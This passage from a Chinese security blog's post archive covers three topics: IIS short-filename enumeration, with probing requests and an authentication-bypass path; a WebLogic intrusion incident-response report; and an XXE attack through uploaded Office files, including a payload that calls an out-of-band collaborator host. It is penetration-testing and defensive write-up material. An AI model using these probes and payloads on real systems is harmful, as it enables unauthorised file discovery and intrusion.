<td>404 - Valid: It starts with“A”</td>
</tr>
<tr>
<td><a href="http://sdl.me/aa*~1*/.aspx">http://sdl.me/aa*~1*/.aspx</a></td>
<td>400 - Invalid: The second letter is not“A”</td>
</tr>
<tr>
<td><a href="http://sdl.me/ab*~1*/.aspx">http://sdl.me/ab*~1*/.aspx</a></td>
<td>400 - Invalid: The second letter is not“B”</td>
</tr>
<tr>
<td><a href="http://sdl.me/ac*~1*/.aspx">http://sdl.me/ac*~1*/.aspx</a></td>
<td>404 - Valid: The second letter is “C”</td>
</tr>
<tr>
<td><a href="http://sdl.me/ac%3f~1*/.aspx">http://sdl.me/ac%3f~1*/.aspx</a></td>
<td>400 - Invalid: It has more than three characters</td>
</tr>
<tr>
<td><a href="http://sdl.me/ac%3f%3f%3f%3f~1/*/.aspx">http://sdl.me/ac%3f%3f%3f%3f~1\*/.aspx</a></td>
<td>404 - Valid: It has 6 or more than 6 characters</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1*/.aspx">http://sdl.me/acsecr~1*/.aspx</a></td>
<td>404 - Valid: It starts with“ACSECR”</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr/~1/.aspx">http://sdl.me/acsecr\~1/.aspx</a></td>
<td>400 - Invalid: It is not a folder and it has an extension</td>
</tr>
<tr>
<td><a href="http://dl.me/acsecr~1.%3f/.aspx">http://dl.me/acsecr~1.%3f/.aspx</a></td>
<td>400- Invalid: Extension has more than 1 character</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1.%3f%3f%3f/.aspx">http://sdl.me/acsecr~1.%3f%3f%3f/.aspx</a></td>
<td>404 - Valid: Extension has 3 or more characters</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1.a%3f%3f/.aspx">http://sdl.me/acsecr~1.a%3f%3f/.aspx</a></td>
<td>400 - Invalid: Extension does not start with“A”</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1.h%3f%3f/.aspx">http://sdl.me/acsecr~1.h%3f%3f/.aspx</a></td>
<td>404 - Valid: Extension starts with“H”</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1.htm/.aspx">http://sdl.me/acsecr~1.htm/.aspx</a></td>
<td>404 - Valid: Extension starts with“HTM”</td>
</tr>
</tbody></table>
<p>但是千里目实验室在真实环境验证发现，在IIS高版本（如：IIS 8.0&#x2F;IIS 8.5&#x2F;IIS 10.0），即使没有安装asp.net，通过 <code>OPTIONS</code> 和 <code>TRACE</code> 方法也可以猜解成功。这两种方法猜解返回的HTTP状态码类型和上述表格内容表有些许出入，但是不失为另一种利用方式。</p>
<p><strong>IIS 10.0 短文件猜解过程分析</strong></p>
<table>
<thead>
<tr>
<th>序号</th>
<th>原始扫描包URL解码</th>
<th>HTTP状态码</th>
<th>状态码含义</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>OPTIONS &#x2F;*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，存在短文件漏洞</td>
</tr>
<tr>
<td>2</td>
<td>OPTIONS &#x2F;?*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，存在1个及以上字母开头的文件</td>
</tr>
<tr>
<td>3</td>
<td>OPTIONS &#x2F;*T*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件名中包含字母T</td>
</tr>
<tr>
<td>4</td>
<td>OPTIONS &#x2F;*~1.*T*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件后综名包含字母T</td>
</tr>
<tr>
<td>5</td>
<td>OPTIONS &#x2F;*S*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件名中包含字母S</td>
</tr>
<tr>
<td>6</td>
<td>OPTIONS &#x2F;*~1.*H*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件后缀名包含字母H</td>
</tr>
<tr>
<td>7</td>
<td>OPTIONS &#x2F;*~1.*M*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件后缀名包含字母M</td>
</tr>
<tr>
<td>8</td>
<td>OPTIONS &#x2F;*0*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中包含数字0</td>
</tr>
<tr>
<td>9</td>
<td>OPTIONS &#x2F;*1*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中包含数字1</td>
</tr>
<tr>
<td>10</td>
<td>OPTIONS &#x2F;I*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中包含字母I开头文件</td>
</tr>
<tr>
<td>11</td>
<td>OPTIONS &#x2F;I?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名I后面包含0个或多个字符</td>
</tr>
<tr>
<td>12</td>
<td>OPTIONS &#x2F;II*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第二个字母为I</td>
</tr>
<tr>
<td>13</td>
<td>OPTIONS &#x2F;II?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名II后面包含0个或多个字符</td>
</tr>
<tr>
<td>14</td>
<td>OPTIONS &#x2F;IIS*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第三个字母为S</td>
</tr>
<tr>
<td>15</td>
<td>OPTIONS &#x2F;IIS?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名IIS后面包含0个或多个字符</td>
</tr>
<tr>
<td>16</td>
<td>OPTIONS &#x2F;IIS1*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第四个字符为数字1</td>
</tr>
<tr>
<td>17</td>
<td>OPTIONS &#x2F;IIS1?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名IIS1后面包含0个或多个字符</td>
</tr>
<tr>
<td>18</td>
<td>OPTIONS &#x2F;IIS10*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第五个字符为数字0</td>
</tr>
<tr>
<td>19</td>
<td>OPTIONS &#x2F;IIS10?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名IIS10后面包含0个或多个字符</td>
</tr>
<tr>
<td>20</td>
<td>OPTIONS &#x2F;IIS10T*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第六个字母为T</td>
</tr>
<tr>
<td>21</td>
<td>OPTIONS &#x2F;IIS10T~1?\a.aspx?aspxerrorpath</td>
<td>200</td>
<td>猜测失败，不包含多个相同的短文件名</td>
</tr>
<tr>
<td>22</td>
<td>OPTIONS &#x2F;IIS10T*~2*\a.aspx?aspxerrorpath</td>
<td>200</td>
<td>猜测失败，不包含2个相同的短文件名</td>
</tr>
<tr>
<td>23</td>
<td>OPTIONS &#x2F;IIS10T~1.H*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名未重复且后缀以开头</td>
</tr>
<tr>
<td>24</td>
<td>OPTIONS &#x2F;IIS10T~1.HT*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名未重复且后缀第二字母为T</td>
</tr>
<tr>
<td>25</td>
<td>OPTIONS &#x2F;IIS10T~1.HTM\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功并结束，IIS10T~1.HIM被猜测出来</td>
</tr>
</tbody></table>
<p><strong>TRACE方法猜解分析</strong></p>
<p>通过TRACE方法猜解的过程基本同上，只不过此HTTP方法猜解失败返回的状态码不是200，而是501（未执行）。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="1-深入爆破猜测文件全名"><a href="#1-深入爆破猜测文件全名" class="headerlink" title="1. 深入爆破猜测文件全名"></a>1. 深入爆破猜测文件全名</h4><p>通过 IIS 短文件漏洞猜测出来的短文件名称，需要继续猜测出全名才可以在IIS上进行访问，即 IIS 由于安全原因不支持短文件名访问。以下是 Soroush Dalili 给出的几种猜测文件全名的方法：</p>
<ol>
<li>通过对目标网站或同类型网站进行爬虫，爬出建立一个字典库，再与得到的短文件名来猜剩下的字符 ；</li>
<li>利用 <a href="http://code.google.com/p/fuzzdb/">fuzzdb</a> (一个应用程序模糊测试(fuzzing)数据库)来猜解；</li>
<li>结合OWASP的 <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a> （一款路径及网页暴力破解的工具）。</li>
</ol>
<p>Github 上有研究人员已经用 python 将上述方法实现，并且获取到了网站后台的用户名和密码，很好的利用了 IIS 短文件漏洞。</p>
<blockquote>
<p>注： <br>研究报告地址：<a href="https://webbreacher.com/2014/10/23/tilde-enumeration/">https://webbreacher.com/2014/10/23/tilde-enumeration/</a> （推荐）<br>python 程序下载：<a href="https://github.com/WebBreacher/tilde_enum">https://github.com/WebBreacher/tilde_enum</a> （推荐）</p>
</blockquote>
<h4 id="2-结合支持短文件特性软件（Apache、Wordpress）"><a href="#2-结合支持短文件特性软件（Apache、Wordpress）" class="headerlink" title="2. 结合支持短文件特性软件（Apache、Wordpress）"></a>2. 结合支持短文件特性软件（Apache、Wordpress）</h4><p>Acunetix 研究指出当 Apache 运行在 windows 下，如果创建了一个长文件，那么无需猜解长文件，直接用短文件就可以下载了。例如一个 <code>backup_20180101.sql</code> 的长文件，其短文件是 <code>BACKUP~1.SQL</code>，攻击者只需要提交 <code>BACKUP~1.SQL</code> 就可以直接访问并下载该文件。</p>
<p>此外，有学者表明，其在安装Wordpress备份插件之后，通过短文件名成功地访问到了了WordPress博客的备份文件。</p>
<h4 id="3-绕过Basic-and-Windows认证"><a href="#3-绕过Basic-and-Windows认证" class="headerlink" title="3. 绕过Basic and Windows认证"></a>3. 绕过Basic and Windows认证</h4><p>Soroush Dalilide 研究中还提到，在某些 IIS 服务器配置下，可以绕过 Basic and Windows 认证，猜解出认证目录下的文件。举例，如果需要访问一个开启认证的目录下文件时，比如这个目录是 “AuthNeeded”，那么可以通过如下方式访问：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/AuthNeeded::$Index_Allocation/*~1*/.aspx</span><br><span class="line">或者</span><br><span class="line">/AuthNeeded:$I30:$Index_Allocation/*~1*/.aspx</span><br></pre></td></tr></table></figure>
<h3 id="此漏洞存在以下几个局限点："><a href="#此漏洞存在以下几个局限点：" class="headerlink" title="此漏洞存在以下几个局限点："></a>此漏洞存在以下几个局限点：</h3><ol>
<li>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</li>
<li>如果文件名本身太短（无短文件名）也是无法猜解的；</li>
<li>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</li>
<li>如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报；</li>
<li>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测。</li>
</ol>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h4 id="通用漏洞修复方案"><a href="#通用漏洞修复方案" class="headerlink" title="通用漏洞修复方案"></a>通用漏洞修复方案</h4><p><strong>1. CMD关闭NTFS 8.3文件格式的支持</strong><br>举例：（1代表关闭，0代表开启）<br>Windows Server 2008 R2：<br>查询是否开启短文件名功能：fsutil 8dot3name query<br>关闭该功能：fsutil 8dot3name set 1<br>Windows Server 2003：<br>关闭该功能：fsutil behavior set disable8dot3 1<br>不同系统关闭命令稍有区别，该功能默认是开启的，对于大多数用户来说无需开启。</p>
<p><strong>2. 修改注册表禁用短文件名功能</strong><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation 这一项的值设为 1，1代表不创建短文件名格式<br>修改完成后，需要重启系统生效</p>
<blockquote>
<p>注：此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除，需要重新复制才会消失。</p>
</blockquote>
<p><em>以下两种方法仅适用于缓解GET 方法，其他方法依旧可以猜解。</em><br><strong>3. 关闭Web服务扩展- ASP.NET</strong><br><strong>4. 升级netFramework至4.0以上版本</strong></p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04-参考"></a>0x04-参考</h2><p>备份文件在特定环境下（apache）可被任意下载（利用windows短文件名）：<a href="http://www.jinglingshu.org/?p=6039%5C">http://www.jinglingshu.org/?p=6039\</a><br>IIS短文件名漏洞知识：<a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>短文件名</tag>
        <tag>文件下载</tag>
        <tag>目录猜解</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次服务器应急响应</title>
    <url>/2022/03/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>2021年5月26日早，突然收到同事通知，云平台某服务器A出现异常。表像为：A对其他主机进行漏洞扫描攻击。</p>
<h2 id="0x02-事件处置"><a href="#0x02-事件处置" class="headerlink" title="0x02 事件处置"></a>0x02 事件处置</h2><h3 id="获取基本信息"><a href="#获取基本信息" class="headerlink" title="获取基本信息"></a>获取基本信息</h3><p><strong>访谈相关人员：</strong></p>
<ol>
<li>服务器IP&#x2F;域名地址：<code>***.***.118.103</code>，<code>****.*****.***.cn</code>；</li>
<li>服务器名称：培训考勤签到系统；</li>
<li>上线时间：2021年1月；</li>
<li>是否对互联网服务：是；</li>
<li>中间件：weblogic 12.1，前段时间排查过程发现存在漏洞，由于运维无法提供补丁，采取禁用 T3 及 IIOP 协议缓解部分漏洞，继续对外服务；</li>
<li>何时出现异常现场：2021年5月26日；</li>
<li>异常情况：对其他服务器进行扫描攻击；</li>
<li>其他信息：采用 HTTPS 方式加密传输；内部负载均衡地址：<code>***.**.26.191</code>，端口：<code>443</code>；外部负载均衡地址：<code>***.**.26.10</code>，端口：<code>443</code>；服务器上线过程中存在不规范，安全人员不知情，服务器未加入 WAF 等安全设备进行保护 。</li>
</ol>
<h3 id="恶意文件查杀"><a href="#恶意文件查杀" class="headerlink" title="恶意文件查杀"></a>恶意文件查杀</h3><p>对服务器A进行恶意文件查杀，发现服务器是裸奔，临时下载火绒合D盾对服务器进行恶意文件识别（不建议使用火绒），火绒识别4个恶意文件，D盾识别6个恶意文件，文件创建事件均为5月25日。</p>
<h3 id="流量分析平台记录分析"><a href="#流量分析平台记录分析" class="headerlink" title="流量分析平台记录分析"></a>流量分析平台记录分析</h3><p>翻查NGSOC关于 <code>***.***.118.103</code> 的WEB流量记录，只有零星几条，无法获取有效信息。</p>
<p>翻查 access 日志尝试获取有用信息的时候，发现日志中有weblogic 的 CVE-2020-14882 攻击记录，payload 作用为反弹shell，根据 payload 的上的反弹地址发现一个攻击者IP，尝试在NGSOC上搜索该源 IP 地址，发现记录，其中该记录目的地址为： <code>***.**.26.10</code> 。访问管理员后发现互联网地址与 <code>***.***.118.103</code> 通讯，需经过内外负载均衡，外部负载均衡地址为： <code>***.**.26.10</code> 。</p>
<p>查询关于外部负载均衡地址（ <code>***.**.26.10</code> ）的 WEB 流量记录，依然只有零星几条记录，陷入死局。过了一段时间，原来是忽略了服务器采用 HTTPS 加密协议传输，且未将证书私钥导入 <strong>NDS</strong> 内，所以无法通过 <code>FLOW_WEB</code> 表查询 WEB 流量记录，只能通过 <code>FLOW_SSL</code> 表查询 SS L加密协商流量，然而 SSL 加密流量的内容完全看不到，只能查询该段时间哪些 IP 访问过。</p>
<p>通过 NGSOC 平台搜索语法筛选5月21-26日访问该应用系统的互联网地址，发现从25日凌晨开始有19个异常高频的访问记录，大多数为来自中国四川。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>IP</th>
<th>IP的物理位置</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>39.144.137.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>2</td>
<td>39.144.137.**</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>3</td>
<td>139.207.149.***</td>
<td>四川省</td>
</tr>
<tr>
<td>4</td>
<td>81.69.33.***</td>
<td>上海市</td>
</tr>
<tr>
<td>5</td>
<td>39.144.137.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>6</td>
<td>171.210.45.***</td>
<td>四川省</td>
</tr>
<tr>
<td>7</td>
<td>116.169.1.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>8</td>
<td>125.34.74.**</td>
<td>北京市</td>
</tr>
<tr>
<td>9</td>
<td>171.88.165.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>10</td>
<td>171.221.43.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>11</td>
<td>114.253.56.***</td>
<td>北京市</td>
</tr>
<tr>
<td>12</td>
<td>117.136.32.***</td>
<td>广州市</td>
</tr>
<tr>
<td>13</td>
<td>106.13.30.***</td>
<td>广州市</td>
</tr>
<tr>
<td>14</td>
<td>165.227.136.***</td>
<td>德国 黑森州 美因河畔法兰克福</td>
</tr>
<tr>
<td>15</td>
<td>222.212.129.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>16</td>
<td>45.146.164.***</td>
<td>俄罗斯 莫斯科州 莫斯科</td>
</tr>
<tr>
<td>17</td>
<td>45.147.197.***</td>
<td>荷兰 海尔德兰省 杜廷赫姆</td>
</tr>
<tr>
<td>18</td>
<td>115.171.244.**</td>
<td>北京市</td>
</tr>
<tr>
<td>19</td>
<td>198.20.69.**</td>
<td>美国 亚利桑那州 菲尼克斯</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>结合恶意文件创建时间及 NGSOC流 量记录信息，判断攻击者开展攻击时间为2021年5月25日凌晨0时至2021年5月26日上午10点30分（服务器断网时间点）。为更全面发现服务器A存在的恶意文件，将2021年5月25日-26日新增的文件全部备份并开展人工分析。通过人工分析，从161个文件中发现27个恶意文件（含D盾及火绒识别出来的恶意文件），恶意文件类型包括：webshell(冰蝎木马)、流量代理文件、MS17-010 扫描工具、Windows密码提取工具（mimikatz.exe、procdump64.exe）、CS木马、主机扫描工具等。</p>
<p>分析CS马过程中，发现反连域名及反连IP地址， <code>3ead0dfe.ns2.*****.site</code> 、 <code>3ead0dfe.ns2.*****.site</code> 、 <code>171.***.***.***</code> 。通过whois、搜索引擎结合域名信息查到攻击者QQ号，照片等个人信息。</p>
<blockquote>
<p>PS：自动化分析平台：</p>
</blockquote>
<ol>
<li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li>
<li><a href="https://app.any.run/">https://app.any.run/</a></li>
</ol>
<blockquote>
<p>手动行为分析工具：火绒剑、promon</p>
</blockquote>
<h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><p>PcLog 查询系统操作，发现5月25日15点00分执行过CS木马“123321.exe” , 执行结果为失败，软件崩溃。此外，其他信息均为登陆记录。<br>RegRipper3.0 查询 Amcache，发现5月25日分别执行过 dns.exe、fscsn64.exe、123321.exe、amd.exe、mimikatz.exe。<br>RegistryExplorer 查询 UserAssist，未发现5月25日的信息。</p>
<h2 id="0x03-分析结果"><a href="#0x03-分析结果" class="headerlink" title="0x03 分析结果"></a>0x03 分析结果</h2><p>access 日志记录信息不全（原因未知，HTTPS协议的关系？），流量记录分析平台的相关内容均是加密状态，无法查看。根据中间件情况（未安装的补丁的weblogic）及恶意文件的存放的路径，推断攻击者通过weblogic反序列化漏洞入侵。</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>非法入侵</tag>
      </tags>
  </entry>
  <entry>
    <title>通过 Office Open XML 解析器进行XXE攻击</title>
    <url>/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>

<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>XXE</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
</search>
